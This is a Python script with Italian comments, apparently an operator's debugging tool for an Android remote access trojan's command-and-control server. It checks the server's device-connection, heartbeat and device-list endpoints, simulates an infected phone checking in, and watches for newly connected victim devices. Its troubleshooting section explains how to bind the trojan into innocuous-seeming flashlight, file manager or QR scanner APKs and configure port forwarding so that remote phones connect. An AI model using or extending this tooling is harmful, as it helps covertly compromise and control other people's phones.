#!/usr/bin/env python3
"""
🔍 Debug Connessione Dispositivo RAT
Diagnostica perché i dispositivi non si connettono
"""

import requests
import json
import time
import socket
from datetime import datetime

def check_server_status():
    """Verifica se il server RAT è attivo"""
    print("🔍 Checking RAT server status...")
    
    try:
        # Test connessione locale
        response = requests.get("http://localhost:12000", timeout=5)
        print(f"✅ Server is running (Status: {response.status_code})")
        return True
    except requests.exceptions.ConnectionError:
        print("❌ Server is NOT running")
        print("   → Start server with: python3 app.py")
        return False
    except Exception as e:
        print(f"❌ Server check failed: {e}")
        return False

def check_rat_endpoints():
    """Verifica endpoint specifici del RAT"""
    print("\n🤖 Checking RAT endpoints...")
    
    endpoints = {
        "/api/rat_connect": "Device connection endpoint",
        "/api/heartbeat": "Heartbeat endpoint", 
        "/api/devices": "Device list endpoint",
        "/dashboard": "Web dashboard"
    }
    
    for endpoint, description in endpoints.items():
        try:
            response = requests.get(f"http://localhost:12000{endpoint}", timeout=5)
            status = "✅" if response.status_code in [200, 404] else "⚠️"
            print(f"  {status} {endpoint}: {response.status_code} - {description}")
        except Exception as e:
            print(f"  ❌ {endpoint}: Error - {e}")

def check_connected_devices():
    """Verifica dispositivi connessi"""
    print("\n📱 Checking connected devices...")
    
    try:
        response = requests.get("http://localhost:12000/api/devices", timeout=5)
        if response.status_code == 200:
            devices = response.json()
            if devices:
                print(f"✅ Found {len(devices)} connected device(s):")
                for device in devices:
                    print(f"   - Device ID: {device.get('device_id', 'Unknown')}")
                    print(f"     Last seen: {device.get('last_seen', 'Unknown')}")
                    print(f"     Status: {device.get('status', 'Unknown')}")
            else:
                print("❌ No devices connected")
                print("   → This is the problem we need to solve")
        else:
            print(f"⚠️ Device endpoint returned status {response.status_code}")
    except Exception as e:
        print(f"❌ Failed to check devices: {e}")

def monitor_connections(duration=60):
    """Monitora connessioni in arrivo"""
    print(f"\n👀 Monitoring connections for {duration} seconds...")
    print("   (Install and open your bound APK now)")
    
    start_time = time.time()
    last_device_count = 0
    
    while time.time() - start_time < duration:
        try:
            response = requests.get("http://localhost:12000/api/devices", timeout=3)
            if response.status_code == 200:
                devices = response.json()
                current_count = len(devices)
                
                if current_count != last_device_count:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    if current_count > last_device_count:
                        print(f"🎉 [{timestamp}] NEW DEVICE CONNECTED! Total: {current_count}")
                        # Mostra dettagli del nuovo dispositivo
                        for device in devices[-1:]:  # Ultimo dispositivo
                            print(f"   Device ID: {device.get('device_id', 'Unknown')}")
                            print(f"   IP: {device.get('ip', 'Unknown')}")
                    else:
                        print(f"📱 [{timestamp}] Device count: {current_count}")
                    last_device_count = current_count
                
            time.sleep(3)
        except KeyboardInterrupt:
            print("\n⏹️ Monitoring stopped by user")
            break
        except Exception as e:
            print(f"❌ Monitoring error: {e}")
            time.sleep(3)
    
    print(f"\n📊 Monitoring completed. Final device count: {last_device_count}")

def test_device_connection_simulation():
    """Simula una connessione dispositivo per test"""
    print("\n🧪 Testing device connection simulation...")
    
    # Simula una richiesta come farebbe l'APK
    device_data = {
        "device_id": "TEST_DEVICE_123",
        "device_info": "Test Android Device",
        "ip": "192.168.1.100"
    }
    
    try:
        response = requests.post(
            "http://localhost:12000/api/rat_connect",
            json=device_data,
            timeout=10
        )
        
        if response.status_code == 200:
            print("✅ Device connection endpoint working correctly")
            print(f"   Response: {response.text}")
        else:
            print(f"⚠️ Unexpected response: {response.status_code}")
            print(f"   Response: {response.text}")
            
    except Exception as e:
        print(f"❌ Connection simulation failed: {e}")

def check_network_accessibility():
    """Verifica accessibilità di rete"""
    print("\n🌐 Checking network accessibility...")
    
    # Test IP locale
    local_ip = socket.gethostbyname(socket.gethostname())
    print(f"🏠 Local IP: {local_ip}")
    
    # Test IP pubblico
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        print(f"🌍 Public IP: {public_ip}")
    except:
        print("❌ Could not get public IP")
        public_ip = None
    
    # Test accessibilità locale
    try:
        response = requests.get(f"http://{local_ip}:12000", timeout=5)
        print(f"✅ Server accessible via local IP: {local_ip}:12000")
    except:
        print(f"❌ Server NOT accessible via local IP: {local_ip}:12000")
    
    # Test accessibilità pubblica (se possibile)
    if public_ip:
        try:
            response = requests.get(f"http://{public_ip}:12000", timeout=10)
            print(f"✅ Server accessible via public IP: {public_ip}:12000")
        except:
            print(f"❌ Server NOT accessible via public IP: {public_ip}:12000")
            print("   → Port forwarding may not be configured correctly")

def show_troubleshooting_tips():
    """Mostra suggerimenti per la risoluzione dei problemi"""
    print("\n🔧 TROUBLESHOOTING TIPS")
    print("=" * 50)
    
    print("\n1️⃣ APK PROBLEMS:")
    print("   ❌ Calculator apps have limited permissions")
    print("   ✅ Use: Flashlight, File Manager, or QR Scanner apps")
    print("   ✅ Ensure APK has INTERNET permission")
    
    print("\n2️⃣ IP CONFIGURATION:")
    print("   🏠 Same WiFi network: Use local IP (10.2.53.11)")
    print("   📱 Mobile data: Use public IP (your external IP)")
    print("   ⚠️ Don't mix local IP with mobile data testing")
    
    print("\n3️⃣ BINDING CONFIGURATION:")
    print("   📝 When binding APK, use correct IP for your test scenario")
    print("   📝 Always use port 12000")
    print("   📝 Make sure port forwarding is configured")
    
    print("\n4️⃣ DEVICE TESTING:")
    print("   📱 Install bound APK")
    print("   🚀 Open the app at least ONCE")
    print("   ⏰ Wait 30-60 seconds for connection")
    print("   🔄 Check dashboard for new devices")
    
    print("\n5️⃣ NETWORK TESTING:")
    print("   🌐 Test from device browser: http://YOUR_IP:12000")
    print("   ✅ If dashboard loads, IP is correct")
    print("   ❌ If doesn't load, check IP/port forwarding")

def main():
    print("🔥 RAT DEVICE CONNECTION DEBUGGER")
    print("=" * 50)
    
    # 1. Check server status
    if not check_server_status():
        print("\n❌ Server is not running. Start it first!")
        return
    
    # 2. Check endpoints
    check_rat_endpoints()
    
    # 3. Check current devices
    check_connected_devices()
    
    # 4. Test connection simulation
    test_device_connection_simulation()
    
    # 5. Check network accessibility
    check_network_accessibility()
    
    # 6. Show troubleshooting tips
    show_troubleshooting_tips()
    
    # 7. Offer to monitor connections
    print("\n" + "=" * 50)
    monitor_choice = input("🔍 Do you want to monitor for new device connections? (y/n): ")
    if monitor_choice.lower() == 'y':
        duration = input("⏰ Monitor duration in seconds (default 60): ")
        try:
            duration = int(duration) if duration else 60
        except:
            duration = 60
        monitor_connections(duration)
    
    print("\n✅ Debugging completed!")
    print("📱 If no devices connect, check the troubleshooting tips above.")

if __name__ == "__main__":
    main()